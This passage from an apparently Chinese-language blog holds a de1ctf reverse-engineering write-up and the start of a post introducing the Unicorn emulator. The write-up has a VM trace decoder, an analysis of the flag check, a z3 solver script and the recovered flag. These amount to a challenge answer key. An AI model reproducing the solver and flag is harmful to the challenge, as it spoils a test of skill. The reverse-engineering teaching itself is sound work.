6L, 1L, 5L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 161L, 0L, 0L, 0L, 6L, 0L, 2L, 3L, 6L, 0L, 0L, 2L, 204L, 8L, 1L, 0L, 3L, 0L, 0L, 0L, 204L, 1L, 0L, 0L, 2L, 6L, 0L, 2L, 0L, 6L, 0L, 0L, 5L, 204L, 0L, 0L, 0L, 2L, 6L, 0L, 2L, 0L, 6L, 1L, 0L, 50L, 0L, 0L, 0L, 204L, 0L, 0L, 0L, 2L, 6L, 2L, 1L, 0L, 6L, 0L, 2L, 5L, 6L, 0L, 0L, 2L, 204L, 8L, 1L, 0L, 3L, 0L, 0L, 0L, 204L, 1L, 0L, 0L, 2L, 6L, 0L, 2L, 0L, 6L, 0L, 0L, 4L, 204L, 0L, 0L, 0L, 2L, 6L, 0L, 2L, 0L, 6L, 1L, 0L, 0L, 0L, 0L, 0L, 204L, 0L, 0L, 0L, 2L, 6L, 2L, 2L, 0L, 6L, 0L, 0L, 1L, 204L, 2L, 0L, 0L, 2L, 204L, 4L, 1L, 0L, 0L, 1L, 0L, 0L, 204L, 0L, 0L, 6L, 0L, 204L, 4L, 1L, 6L, 0L, 1L, 0L, 0L, 6L, 0L, 0L, 5L, 204L, 0L, 1L, 0L, 1L, 0L, 0L, 0L, 6L, 0L, 5L, 0L, 48L, 192L, 246L, 248L, 1L, 5L, 6L, 0L, 0L, 0L, 0L, 0L, 6L, 92L, 255L, 255L, 255L, 6L, 0L, 2L, 3L, 6L, 0L, 0L, 2L, 204L, 8L, 1L, 0L, 3L, 0L, 0L, 0L, 204L, 1L, 0L, 0L, 2L, 6L, 0L, 2L, 0L, 6L, 0L, 0L, 4L, 204L, 0L, 0L, 0L, 2L, 6L, 0L, 2L, 0L, 6L, 1L, 0L, 150L, 0L, 0L, 0L, 204L, 0L, 0L, 0L, 2L, 6L, 0L, 1L, 6L, 6L, 32L, 0L, 1L, 6L, 0L, 0L, 4L, 204L, 0L, 1L, 0L, 1L, 0L, 0L, 0L, 6L, 0L, 4L, 0L, 48L, 192L, 246L, 248L, 1L, 4L, 6L, 0L, 0L, 0L, 0L, 0L, 6L, 236L, 254L, 255L, 255L, 6L, 0L, 0L, 3L, 204L, 0L, 1L, 0L, 1L, 0L, 0L, 0L, 6L, 0L, 3L, 0L, 48L, 192L, 246L, 248L, 1L, 3L, 9L, 0L, 0L, 0L, 0L, 0L, 6L, 189L, 254L, 255L, 255L, 6L, 1L, 3L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 99L, 0L, 0L, 0L, 6L, 0L, 0L, 3L, 6L, 0L, 2L, 0L, 6L, 1L, 0L, 150L, 0L, 0L, 0L, 204L, 0L, 0L, 0L, 2L, 6L, 2L, 1L, 0L, 6L, 0L, 0L, 3L, 6L, 0L, 2L, 0L, 6L, 1L, 0L, 250L, 0L, 0L, 0L, 204L, 0L, 0L, 0L, 2L, 6L, 2L, 0L, 0L, 48L, 192L, 246L, 248L, 0L, 1L, 0L, 0L, 0L, 1L, 21L, 0L, 0L, 0L, 6L, 1L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 47L, 0L, 0L, 0L, 6L, 0L, 0L, 3L, 204L, 0L, 1L, 0L, 1L, 0L, 0L, 0L, 6L, 0L, 3L, 0L, 48L, 192L, 246L, 248L, 1L, 3L, 69L, 0L, 0L, 0L, 0L, 0L, 6L, 154L, 255L, 255L, 255L, 6L, 1L, 0L, 1L, 0L, 0L, 0L, 201L, 195L]</span><br><span class="line"># print file.readline();</span><br><span class="line"># print file.readline();</span><br><span class="line"># print file.readline();</span><br><span class="line">pc = 0;</span><br><span class="line">next_pc = pc;</span><br><span class="line">tmp = 0;</span><br><span class="line">Reg = [0]*100;</span><br><span class="line">zflag = 0;</span><br><span class="line"># const = list(&quot;Almost heaven west virginia, blue ridge mountains&quot;+&apos;\x00de1ctf&#123;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!!!&#125;\x00\x00\x00\x00\x00&apos;.ljust(300,&apos;\x00&apos;));</span><br><span class="line">def Dword(pc):</span><br><span class="line">	ret = &apos;&apos;.join( [ chr(opcode[i]) for i in range(pc,pc+4) ]);</span><br><span class="line">	return unpack(&apos;&lt;I&apos;,ret)[0];</span><br><span class="line">def Int(pc):</span><br><span class="line">	ret = &apos;&apos;.join( [ chr(opcode[i]) for i in range(pc,pc+4) ]);</span><br><span class="line">	return unpack(&apos;&lt;i&apos;,ret)[0];</span><br><span class="line">def func1():</span><br><span class="line"></span><br><span class="line">	global pc;</span><br><span class="line">	global next_pc;</span><br><span class="line">	global zflag;</span><br><span class="line">	global Reg;</span><br><span class="line">	global tmp;</span><br><span class="line">	global opcode</span><br><span class="line">	# print &apos;func1&apos;</span><br><span class="line">	# return;</span><br><span class="line">	if opcode[pc+1]==1:</span><br><span class="line">		tmp = Dword(pc+3);</span><br><span class="line">		next_pc+=7;</span><br><span class="line">		# print &apos;GGGGGGGGG&apos;</span><br><span class="line">		print &apos;Mov tmp , 0x%x&apos;%tmp;</span><br><span class="line">	else :</span><br><span class="line">		tmp = opcode[pc+3];</span><br><span class="line">		next_pc+=4;</span><br><span class="line">		# print &apos;GGGGGGGGG&apos;</span><br><span class="line">		print &apos;Mov tmp , 0x%x&apos;%tmp;</span><br><span class="line">	if opcode[pc+1]==1:</span><br><span class="line">		Reg[ opcode[pc+2] ]=tmp;</span><br><span class="line">		print &apos;Mov Reg[ %d ] , 0x%x&apos;%(opcode[pc+2],tmp);</span><br><span class="line">	elif opcode[pc+1]&gt;1:</span><br><span class="line">		if opcode[pc+1]==2:</span><br><span class="line">			print &apos;Mov r0 , Reg[%d] &apos;%tmp;</span><br><span class="line">			s = const[ Reg[tmp] ];</span><br><span class="line">			r0 = Reg[tmp];</span><br><span class="line">			Reg[opcode[pc+2]]=const[ Reg[tmp] ];</span><br><span class="line">			print &apos;Mov Reg[%d] , const[r0] (%c) r0=%d&apos;%( opcode[pc+2] , s , r0 );</span><br><span class="line">		elif opcode[pc+1]==32:</span><br><span class="line">			print &apos;Mov r0 , Reg[%d]&apos;%(opcode[pc+2]);</span><br><span class="line">			r0 = Reg[opcode[pc+2]];</span><br><span class="line">			print &apos;r0 = &apos;,r0</span><br><span class="line">			const[ Reg[opcode[pc+2]] ] = Reg[tmp];</span><br><span class="line">			print &apos;Mov const[r0] , reg[%d] (%c) r0=%d&apos; %( tmp,Reg[tmp] ,r0);</span><br><span class="line">	elif opcode[pc+1]==0:</span><br><span class="line">		Reg[ opcode[pc+2] ] = Reg[tmp];</span><br><span class="line">		print &apos;Mov Reg[%d] , Reg[%d]  (0x%x)&apos;%(opcode[pc+2],tmp,Reg[tmp]);</span><br><span class="line"></span><br><span class="line">def func2():</span><br><span class="line">	# print &apos;func2&apos;</span><br><span class="line">	# return;</span><br><span class="line">	global opcode</span><br><span class="line">	global pc;</span><br><span class="line">	global next_pc;</span><br><span class="line">	global zflag;</span><br><span class="line">	global Reg;</span><br><span class="line">	global tmp;</span><br><span class="line">	if opcode[pc+1]==1:</span><br><span class="line">		tmp = Dword(pc+3);</span><br><span class="line">		next_pc+=7;</span><br><span class="line">		print &apos;Mov tmp , 0x%x&apos;%tmp;</span><br><span class="line">	elif opcode[pc+1]==0 :</span><br><span class="line">		tmp = Reg[ opcode[pc+3] ];</span><br><span class="line">		next_pc+=4;</span><br><span class="line">		print &apos;Mov tmp , Reg[%d] &apos;%opcode[pc+3];</span><br><span class="line">	# print &apos;pc:&apos;,pc;</span><br><span class="line">	if opcode[pc]==0:</span><br><span class="line">		# print opcode[pc+2];</span><br><span class="line">		Reg[ opcode[pc+2] ] += tmp;</span><br><span class="line">		print &apos;Add Reg[%d] , tmp&apos;%(opcode[pc+2]);</span><br><span class="line">		# print &apos;tmp:&apos;,tmp</span><br><span class="line">	elif opcode[pc]==1:</span><br><span class="line">		Reg[ opcode[pc+2] ] -= tmp;</span><br><span class="line">		print &apos;Sub Reg[%d] , tmp&apos;%(opcode[pc+2]);</span><br><span class="line">	elif opcode[pc]==2:</span><br><span class="line">		Reg[ opcode[pc+2] ] *= tmp;</span><br><span class="line">		print &apos;Mul Reg[%d] , tmp&apos;%(opcode[pc+2]);</span><br><span class="line">	elif opcode[pc]==3:</span><br><span class="line">		Reg[ opcode[pc+2] ] /= tmp;</span><br><span class="line">		print &apos;Div Reg[%d] , tmp&apos;%(opcode[pc+2]);</span><br><span class="line">	elif opcode[pc]==4:</span><br><span class="line">		Reg[ opcode[pc+2] ] %= tmp;</span><br><span class="line">		print &apos;Mod Reg[%d] , tmp&apos;%(opcode[pc+2]);</span><br><span class="line">	elif opcode[pc]==5:</span><br><span class="line">		Reg[ opcode[pc+2] ] |= tmp;</span><br><span class="line">		print &apos;Or Reg[%d] , tmp&apos;%(opcode[pc+2]);</span><br><span class="line">	elif opcode[pc]==6:</span><br><span class="line">		Reg[ opcode[pc+2] ] &amp;= tmp;</span><br><span class="line">		print &apos;And Reg[%d] , tmp&apos;%(opcode[pc+2]);</span><br><span class="line">	elif opcode[pc]==7:</span><br><span class="line">		Reg[ opcode[pc+2] ] ^= tmp;</span><br><span class="line">		print &apos;Xor Reg[%d] , tmp&apos;%(opcode[pc+2]);</span><br><span class="line">	elif opcode[pc]==8:</span><br><span class="line">		Reg[ opcode[pc+2] ] &lt;&lt;= tmp;</span><br><span class="line">		print &apos;Shl Reg[%d] , tmp&apos;%(opcode[pc+2]);</span><br><span class="line">	elif opcode[pc]==9:</span><br><span class="line">		Reg[ opcode[pc+2] ] &gt;&gt;= tmp;</span><br><span class="line">		print &apos;Shr Reg[%d] , tmp&apos;%(opcode[pc+2]);</span><br><span class="line"></span><br><span class="line">def func3():</span><br><span class="line">	global pc;</span><br><span class="line">	global next_pc;</span><br><span class="line">	global zflag;</span><br><span class="line">	global Reg;</span><br><span class="line">	global tmp;</span><br><span class="line">	global opcode</span><br><span class="line">	# print &apos;func3&apos;</span><br><span class="line">	# return;</span><br><span class="line">	if opcode[pc+2]==1:</span><br><span class="line">		tmp = Dword(pc+4);</span><br><span class="line">		print &apos;Mov tmp , 0x%x&apos;%(tmp);</span><br><span class="line">		zflag = Reg[ opcode[pc+3] ] - tmp;</span><br><span class="line">		print &apos;Cmp Reg[%d] (%d) , tmp set zflag=%d&apos;%(  opcode[pc+3] , Reg[ opcode[pc+3] ] , zflag );</span><br><span class="line">		next_pc+=8;</span><br><span class="line">	elif opcode[pc+2]==0:</span><br><span class="line">		tmp = opcode[pc+4];</span><br><span class="line">		print &apos;Mov tmp , 0x%x&apos;%(tmp);</span><br><span class="line">		zflag = Reg[ opcode[pc+3] ] - tmp;</span><br><span class="line">		print &apos;Cmp Reg[%d] (%d) , tmp set zflag=%d&apos;%(   opcode[pc+3] , Reg[ opcode[pc+3] ] , zflag );</span><br><span class="line">		next_pc+=5;</span><br><span class="line">def func4():</span><br><span class="line">	global pc;</span><br><span class="line">	global next_pc;</span><br><span class="line">	global zflag;</span><br><span class="line">	global Reg;</span><br><span class="line">	global tmp;</span><br><span class="line">	global opcode</span><br><span class="line">	print &apos;func4&apos;</span><br><span class="line">	# return;</span><br><span class="line">	if opcode[pc+2]==0:</span><br><span class="line">		next_pc+= Int(pc+3);</span><br><span class="line">		# print &apos;get&apos;,Int(pc+3);</span><br><span class="line">		print &apos;goto #0x%x&apos;%(next_pc);</span><br><span class="line">	elif opcode[pc+2]==1:</span><br><span class="line">		print &apos;jne #0x%x&apos;%(next_pc+7);</span><br><span class="line">		if zflag!=0:</span><br><span class="line">			next_pc+=7;</span><br><span class="line">		else :</span><br><span class="line">			next_pc+= Int(pc+3);</span><br><span class="line">	elif opcode[pc+2]==2:</span><br><span class="line">		print &apos;jne #0x%x&apos;%( next_pc+Int(pc+3) );</span><br><span class="line">		if zflag!=0:</span><br><span class="line">			next_pc += Int(pc+3);</span><br><span class="line">		else :</span><br><span class="line">			next_pc+=7;</span><br><span class="line">	elif opcode[pc+2]==3:</span><br><span class="line">		print &apos;jbe #0x%x&apos;%(next_pc+7);</span><br><span class="line">		if zflag&lt;=0:</span><br><span class="line">			next_pc+=7;			</span><br><span class="line">		else :</span><br><span class="line">			next_pc+= Int(pc+3);</span><br><span class="line">	elif opcode[pc+2]==4:</span><br><span class="line">		print &apos;jb #0x%x&apos;%(next_pc+7);</span><br><span class="line">		if zflag&lt;0:</span><br><span class="line">			next_pc+=7;</span><br><span class="line">		else :</span><br><span class="line">			next_pc+= Int(pc+3);</span><br><span class="line">	elif opcode[pc+2]==5:</span><br><span class="line">		print &apos;jge #0x%x&apos;%(next_pc+7);</span><br><span class="line">		if zflag&gt;=0:</span><br><span class="line">			next_pc+=7;		</span><br><span class="line">		else :</span><br><span class="line">			next_pc+= Int(pc+3);</span><br><span class="line">	elif opcode[pc+2]==6:</span><br><span class="line">		print &apos;jg #0x%x&apos;%(next_pc+7);</span><br><span class="line">		if zflag&gt;0:</span><br><span class="line">			next_pc+=7;			</span><br><span class="line">		else :</span><br><span class="line">			next_pc+= Int(pc+3);</span><br><span class="line"></span><br><span class="line"># stat_array</span><br><span class="line"></span><br><span class="line">pc_array = [];</span><br><span class="line">func_array = [];</span><br><span class="line">stat = &#123;</span><br><span class="line">	&quot;== SIGILL&#125;]&quot;:func1,</span><br><span class="line">	&quot;== SIGFPE&#125;]&quot;:func3,</span><br><span class="line">	&quot;== SIGTRAP&#125;]&quot;:func2,</span><br><span class="line">	&quot;== SIGSEGV&#125;]&quot;:func4,</span><br><span class="line">&#125;</span><br><span class="line"># global pc;</span><br><span class="line"># global opcode;</span><br><span class="line">opcode = [];</span><br><span class="line">f = open(&quot;1.txt&quot;);</span><br><span class="line">flag = &quot;de1ctf&#123;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!!!&#125;&quot;</span><br><span class="line">const = [65L, 108L, 109L, 111L, 115L, 116L, 32L, 104L, 101L, 97L, 118L, 101L, 110L, 32L, 119L, 101L, 115L, 116L, 32L, 118L, 105L, 114L, 103L, 105L, 110L, 105L, 97L, 44L, 32L, 98L, 108L, 117L, 101L, 32L, 114L, 105L, 100L, 103L, 101L, 32L, 109L, 111L, 117L, 110L, 116L, 97L, 105L, 110L, 115L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 214L, 77L, 45L, 133L, 119L, 151L, 96L, 98L, 43L, 136L, 134L, 202L, 114L, 151L, 235L, 137L, 152L, 243L, 120L, 38L, 131L, 41L, 94L, 39L, 67L, 251L, 184L, 23L, 124L, 206L, 58L, 115L, 207L, 251L, 199L, 156L, 96L, 175L, 156L, 200L, 117L, 205L, 55L, 123L, 59L, 155L, 78L, 195L, 218L, 216L, 206L, 113L, 43L, 48L, 104L, 70L, 11L, 255L, 60L, 241L, 241L, 69L, 196L, 208L, 196L, 255L, 81L, 241L, 136L, 81L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L]</span><br><span class="line">for i in range(50,50+70):</span><br><span class="line">	const[i]=ord(flag[i-50]);</span><br><span class="line">while True:</span><br><span class="line">	</span><br><span class="line">	pass</span><br><span class="line">	t = f.readline();</span><br><span class="line">	# print  t</span><br><span class="line">	if t==&quot;&quot;:</span><br><span class="line">		break;</span><br><span class="line">	for i in stat:</span><br><span class="line">		if i in t:</span><br><span class="line">			cur_func = stat[i];</span><br><span class="line">	if (&quot;ptrace(PTRACE_PEEKTEXT,&quot; in t) and cur_func!=None:</span><br><span class="line">		pc = 0;</span><br><span class="line">		opcode = [ ord(i) for i in pack( &apos;&lt;Q&apos; , int( t[ t.index(&apos;[&apos;)+1:t.index(&apos;]&apos;) ] , 16 ) ) ];</span><br><span class="line">		# print opcode;</span><br><span class="line">		cur_func();</span><br><span class="line">		cur_func=None;</span><br></pre></td></tr></table></figure>
<p>通过分析可以得知：</p>
<p>程序首先检查flag长度=70，然后有3层循环嵌套，根据flag来生成一个序列与已知序列比较,代码大致如下<br>const为程序中的常量数组，flag就放在这个数组偏移0x32的位置，待比较的数组也是位于const上</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">flag = &quot;de1ctf&#123;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!!!&#125;&quot;</span><br><span class="line">const = [65L, 108L, 109L, 111L, 115L, 116L, 32L, 104L, 101L, 97L, 118L, 101L, 110L, 32L, 119L, 101L, 115L, 116L, 32L, 118L, 105L, 114L, 103L, 105L, 110L, 105L, 97L, 44L, 32L, 98L, 108L, 117L, 101L, 32L, 114L, 105L, 100L, 103L, 101L, 32L, 109L, 111L, 117L, 110L, 116L, 97L, 105L, 110L, 115L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 214L, 77L, 45L, 133L, 119L, 151L, 96L, 98L, 43L, 136L, 134L, 202L, 114L, 151L, 235L, 137L, 152L, 243L, 120L, 38L, 131L, 41L, 94L, 39L, 67L, 251L, 184L, 23L, 124L, 206L, 58L, 115L, 207L, 251L, 199L, 156L, 96L, 175L, 156L, 200L, 117L, 205L, 55L, 123L, 59L, 155L, 78L, 195L, 218L, 216L, 206L, 113L, 43L, 48L, 104L, 70L, 11L, 255L, 60L, 241L, 241L, 69L, 196L, 208L, 196L, 255L, 81L, 241L, 136L, 81L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L]</span><br><span class="line">for i in range(50,50+70):</span><br><span class="line">	const[i]=ord(flag[i-50]);</span><br><span class="line">print &apos;len:&apos;,len(const);</span><br><span class="line">ans = [0]*71</span><br><span class="line">for r3 in range(10):</span><br><span class="line">	for r4 in range(7):</span><br><span class="line">		sum1 = 0;</span><br><span class="line">		for r5 in range(7):</span><br><span class="line">			s = const[ ( 0x32 + (r3&lt;&lt;3)-r3+r5 ) ];</span><br><span class="line">			s1 = const[ ( 0 + ((r5&lt;&lt;3)-r5+r4) ) ];</span><br><span class="line">			sum1 = ( sum1 + s1*s )%0x100</span><br><span class="line">		ans[ (r3&lt;&lt;3)-r3+r4 ] = sum1;</span><br><span class="line">print ans</span><br></pre></td></tr></table></figure>
<p>解题脚本如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">from z3 import *</span><br><span class="line">ans = Solver();</span><br><span class="line">flag = [ BitVec(&apos;x%d&apos;%i, 32) for i in range(70) ];</span><br><span class="line">for i in range(7,69):</span><br><span class="line">	ans.add( flag[i]&gt;=32  );</span><br><span class="line">	ans.add( flag[i]&lt;=127 );</span><br><span class="line">for i in range(7):</span><br><span class="line">	ans.add(flag[i]==const[i+0x32]);</span><br><span class="line">ans.add(flag[69]==ord(&apos;&#125;&apos;));</span><br><span class="line"></span><br><span class="line">c = [214L, 77L, 45L, 133L, 119L, 151L, 96L, 98L, 43L, 136L, 134L, 202L, 114L, 151L, 235L, 137L, 152L, 243L, 120L, 38L, 131L, 41L, 94L, 39L, 67L, 251L, 184L, 23L, 124L, 206L, 58L, 115L, 207L, 251L, 199L, 156L, 96L, 175L, 156L, 200L, 117L, 205L, 55L, 123L, 59L, 155L, 78L, 195L, 218L, 216L, 206L, 113L, 43L, 48L, 104L, 70L, 11L, 255L, 60L, 241L, 241L, 69L, 196L, 208L, 196L, 255L, 81L, 241L, 136L, 81L, 0L]</span><br><span class="line">for r3 in range(10):</span><br><span class="line">	for r4 in range(7):</span><br><span class="line">		sum1 = 0;</span><br><span class="line">		for r5 in range(7):</span><br><span class="line">			s = flag[ ( (r3&lt;&lt;3)-r3+r5 ) ];</span><br><span class="line">			s1 = const[ ( 0 + ((r5&lt;&lt;3)-r5+r4) ) ];</span><br><span class="line">			sum1 = ( sum1 + s1*s );</span><br><span class="line">		ans.add( c[ (r3&lt;&lt;3)-r3+r4 ] == (sum1%0x100) ) ;</span><br><span class="line">if ans.check()==sat :</span><br><span class="line">	m = ans.model();</span><br><span class="line">	print ans.model();</span><br><span class="line">	re=&quot;&quot;</span><br><span class="line">	for i in range(0,70):</span><br><span class="line">		re+=chr( m[flag[i]].as_long().real );</span><br><span class="line">		print re;</span><br><span class="line">else :</span><br><span class="line">	print &quot;error&quot;;</span><br></pre></td></tr></table></figure></p>
<p>de1ctf{7h3n_f4r3_u_w3ll_5w337_cr4g13_HILL_wh3r3_0f3n_71m35_1_v3_r0v3d}</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-Unicorn初步" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2019/08/01/Unicorn初步/" class="article-date">
      <time datetime="2019-08-01T04:19:56.000Z" itemprop="datePublished">2019-08-01</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/08/01/Unicorn初步/">Unicorn初步</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h1 id="模拟一个-x86架构-程序"><a href="#模拟一个-x86架构-程序" class="headerlink" title="模拟一个 x86架构 程序"></a>模拟一个 x86架构 程序</h1><p>首先引入unicorn的模块，并引入常量<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from unicorn import *</span><br><span class="line">from unicorn.x86_const import *</span><br></pre></td></tr></table></figure></p>
<p>初始化unicorn的引擎<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mu = Uc(UC_ARCH_X86,UC_MODE_32);</span><br><span class="line"># 同时还有 UC_MODE_64 64位模式</span><br></pre></td></tr></table></figure></p>
<p>初始化程序<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">base = 0x400000;指定程序载入基址</span><br><span class="line">base_size = 1024*1024;</span><br><span class="line">stack_addr = 0;</span><br><span class="line">stack_size = 1024*1024;</span><br></pre></td></tr></table></figure></p>
<p>为代码和栈空间分配一段内存<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mu.mem_map(base,base_size);</span><br><span class="line">mu.mem_map(stack_addr,stack_size);</span><br><span class="line">mu.mem_write(base,CODE); #CODE为待载入的二进制程序代码,写入内存</span><br><span class="line">mu.reg_write(UC_X86_REG_RSP,stack_addr+stack_size-1); #分配一段栈空间</span><br><span class="line">mu.reg_write(UC_X86_REG_RBP,UC_X86_REG_RSP);</span><br></pre></td></tr></table></figure></p>
<p>然后我们就可以开始模拟执行了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mu.emu_start(start_addr,end_addr);</span><br></pre></td></tr></table></figure></p>
<p>由于unicorn无法模拟syscall，和一系列的库函数，因此我们需要针对性的hook掉这些代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">def hook_code(mu,addr,size,user_data):</span><br><span class="line">	global ins_count</span><br><span class="line">	ins_count+=1;</span><br><span class="line">mu.hook_add(UC_HOOK_CODE,hook_code);# 每执行一条指令就调用一次该函数</span><br></pre></td></tr></table></figure></p>
<p>除了hook每一条指令外，我们还可以hook基本块，和内存操作</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">def hook_block(mu, address, size, user_data):</span><br><span class="line">	global block_count</span><br><span class="line">	block_count+=1;</span><br><span class="line">mu.hook_add(UC_HOOK_BLOCK,hook_block);#每执行一个基本块就调用一次</span><br></pre></td></tr></table></figure>
